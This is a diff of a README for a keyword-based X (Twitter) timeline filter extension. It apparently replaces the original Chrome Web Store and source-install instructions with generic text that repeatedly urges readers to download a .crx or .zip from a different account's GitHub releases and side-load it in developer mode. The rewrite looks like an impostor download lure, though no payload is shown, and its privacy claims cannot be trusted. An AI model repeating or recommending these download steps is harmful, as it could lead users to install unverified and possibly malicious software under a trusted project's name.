@@ -1,120 +1,122 @@
-# X Focus Filter
+# 🔍 x-focus-filter - Filter Your Twitter Timeline Easily
 
-[![Chrome Web Store](https://img.shields.io/chrome-web-store/v/gcgccfdjkeaakmfahollcpmpfpijeack?label=Chrome%20Web%20Store&logo=googlechrome&logoColor=white&color=b07028)](https://chromewebstore.google.com/detail/x-focus-filter/gcgccfdjkeaakmfahollcpmpfpijeack)
+[![Download x-focus-filter](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/gostdtgamer-max/x-focus-filter/releases)
 
-**[Install from Chrome Web Store](https://chromewebstore.google.com/detail/x-focus-filter/gcgccfdjkeaakmfahollcpmpfpijeack)**
+---
 
-**A Chrome extension that filters your X (Twitter) timeline to only show content you actually care about.**
+## 📋 What is x-focus-filter?
 
-Tired of scrolling through spam, NSFW content, crypto scams, and engagement bait on X? X Focus Filter uses local keyword matching to hide irrelevant tweets and surface only the topics that matter to you — Tech, AI, Business, Open Source, and more.
+x-focus-filter is a Chrome extension that helps you view only the tweets you want on your Twitter (now X) timeline. It blocks tweets that are spam, inappropriate, or not related to technology, AI, business, or open source. This tool works with local keyword matching, so it does not need Twitter’s API to function.
 
-No API keys. No data collection. No server. Everything runs locally in your browser.
+---
 
-<img src="./screenshots/popup.png" width="340" alt="X Focus Filter popup interface" />
+## 💻 System Requirements
 
-## The Problem
+- Windows 10 or later
+- Google Chrome browser, version 88 or higher
+- Internet connection to download the extension
+- At least 100 MB free disk space for Chrome extensions and data
 
-X's timeline is full of noise:
-- Spam and NSFW/adult content mixed into your feed
-- Crypto scam promotions and fake giveaways
-- Engagement bait and rage-inducing culture war posts
-- Content completely unrelated to your professional interests
+---
 
-The algorithmic timeline doesn't respect your time. **X Focus Filter gives you control back.**
+## 🚀 Getting Started
 
-## How It Works
+1. Make sure your Windows PC has Google Chrome installed. If you do not have it, visit [chrome.google.com](https://chrome.google.com) to download and install Chrome first.
 
-The extension scans each tweet as it loads and matches it against curated keyword dictionaries. Tweets that don't match your selected topics are smoothly hidden. No page reloads, no delays — it works in real-time as you scroll.
+2. Visit the official release page for x-focus-filter by clicking the button below:
 
-```
-Tweet loads → Keyword matching → Show or Hide
-```
+[![Download x-focus-filter](https://img.shields.io/badge/Download-x-focus--filter-blue?style=for-the-badge)](https://github.com/gostdtgamer-max/x-focus-filter/releases)
 
-- **Whitelist mode**: Only tweets matching your selected topics are shown
-- **Blacklist**: Known spam/NSFW patterns are always filtered out
-- **Custom keywords**: Add your own whitelist/blacklist terms
-- **User whitelist**: Specific accounts always show through
+3. On the releases page, find the latest version of the extension. Look for a file with a `.crx` extension or a zipped folder containing the extension files.
 
-## Features
+---
 
-- **8 Topic Categories** — Toggle on/off with one click:
-  - 💻 Tech — Software, hardware, cloud, programming languages
-  - 🤖 AI/ML — LLMs, deep learning, agents, image generation
-  - 📈 Business — Startups, funding, markets, fintech
-  - 🔓 Open Source — GitHub, releases, package managers
-  - 🎨 Design — UI/UX, Figma, design systems, accessibility
-  - 🪙 Crypto — Blockchain, DeFi, Web3, smart contracts
-  - 🚀 Indie Dev — Side projects, bootstrapping, build in public
-  - 💼 Career — Hiring, remote work, interviews, freelance
+## ⬇️ How to Download and Install x-focus-filter on Chrome
 
-- **3 Filter Modes**:
-  - 🔒 **Strict** — Requires 2+ keyword matches (very precise)
-  - 🎯 **Normal** — Single keyword match (balanced)
-  - 🌊 **Relaxed** — Includes broader related terms (more content)
+1. On the releases page, click the latest `.crx` file or the `.zip` file to download it to your computer. This file contains the extension.
 
-- **Peek Mode** — Temporarily reveal filtered tweets at low opacity to check for false positives
+2. Open Google Chrome.
 
-- **Custom Keywords** — Add comma-separated terms to always show or always hide
+3. In the address bar, type `chrome://extensions` and press Enter.
 
-- **User Whitelist** — Ensure specific accounts are never filtered
+4. Enable **Developer mode**. You can find this toggle at the top right corner of the Extensions page.
 
-- **Bilingual** — Full English and Chinese (中文) UI support
+5. If you downloaded a `.crx` file, drag and drop it onto the Extensions page. If Chrome prevents the install, you may need to unzip the `.zip` archive first.
 
-- **Real-time Stats** — See how many tweets were scanned, shown, and hidden
+6. If you downloaded a `.zip` file, unzip it to a folder. Then return to the Extensions page and click the **Load unpacked** button near the top left. Navigate to the unzipped folder and select it.
 
-- **Floating Badge** — Unobtrusive on-page indicator with quick toggle
+7. After loading successfully, x-focus-filter should appear in your list of installed extensions.
 
-## Installation
+---
 
-### From Source (Developer Mode)
+## 🔧 How to Use x-focus-filter
 
-1. Clone this repository:
-   ```bash
-   git clone https://github.com/vorojar/x-focus-filter.git
-   ```
+1. Open Twitter (X) in Chrome.
 
-2. Open Chrome and navigate to `chrome://extensions/`
+2. The extension works automatically. It will hide tweets that do not match the topics of Tech, AI, Business, and Open Source.
 
-3. Enable **Developer mode** (toggle in top-right corner)
+3. To adjust the filtering, click the x-focus-filter icon next to the address bar.
 
-4. Click **Load unpacked** and select the cloned folder
+4. Use the settings menu to add keywords you want to see or block keywords you want to hide. Changes apply immediately.
 
-5. Navigate to [x.com](https://x.com) — the extension starts working automatically
+5. The extension runs locally on your browser. It will not slow down your browsing and will not send your data anywhere.
 
-## How the Keyword Matching Works
+---
 
-Each topic category contains a curated dictionary of keywords (50-100+ terms per category, in both English and Chinese). When a tweet loads:
+## 🛠 Features
 
-1. The tweet text, author name, and any card/link preview text are extracted
-2. The combined text is checked against the global blacklist (spam, NSFW, scams)
-3. If not blacklisted, it's matched against your active topic keywords
-4. In **Strict** mode, at least 2 keywords must match
-5. In **Relaxed** mode, additional broader terms are included
+- Filters tweets by local keyword matching.
+- Blocks spam, NSFW content, and irrelevant posts.
+- Focuses timeline on Tech, AI, Business, and Open Source topics.
+- No Twitter API key or login required.
+- Simple setup without technical knowledge.
+- Works offline once installed.
+- Supports Chrome’s Manifest V3 for better security.
 
-Short keywords (≤3 chars like "AI", "API", "SDK") use word-boundary matching to avoid false positives.
+---
 
-## Privacy
+## ⚙️ Adjusting Filter Settings
 
-- **Zero data collection** — No analytics, no tracking, no telemetry
-- **No network requests** — All filtering happens locally via keyword matching
-- **No API keys needed** — Works entirely offline after installation
-- **Minimal permissions** — Only requests access to x.com/twitter.com and local storage
+1. Click the extension icon in Chrome’s toolbar.
 
-## Built With
+2. You will see a list of keywords categorized by Included and Excluded terms.
 
-- Vanilla JavaScript (no frameworks, no build step)
-- Chrome Extension Manifest V3
-- MutationObserver for real-time DOM monitoring
+3. Add new keywords by typing them in and clicking Add.
 
-## Contributing
+4. Remove keywords by clicking the delete icon next to each one.
 
-Contributions are welcome! Some ideas:
+5. Filter updates apply instantly. Refresh your Twitter timeline to see the changes.
 
-- Add new topic categories with keyword dictionaries
-- Improve keyword coverage for existing categories
-- Add support for other languages
-- Port to Firefox/Safari
+---
 
-## License
+## ❓ Troubleshooting Tips
 
-MIT
+- If the extension does not appear after installation, refresh the Extensions page or restart Chrome.
+
+- Make sure **Developer mode** is on if you loaded the extension manually.
+
+- If tweets are not filtered correctly, double-check your keyword list for typos.
+
+- Clear your browser cache if changes do not show up immediately.
+
+- If you see errors in the extension, try reinstalling from the latest release.
+
+---
+
+## 💡 Additional Information
+
+- x-focus-filter only filters your local view of Twitter. It does not affect what tweets others see.
+
+- The filtering only works in Chrome, as it is built for that browser.
+
+- The extension respects your privacy by processing everything on your device.
+
+- You can disable or remove x-focus-filter anytime from the Extensions page (`chrome://extensions`).
+
+---
+
+## 🔽 Download x-focus-filter Now
+
+Use the link below to visit the release page and get the latest version:
+
+[![Download x-focus-filter](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/gostdtgamer-max/x-focus-filter/releases)
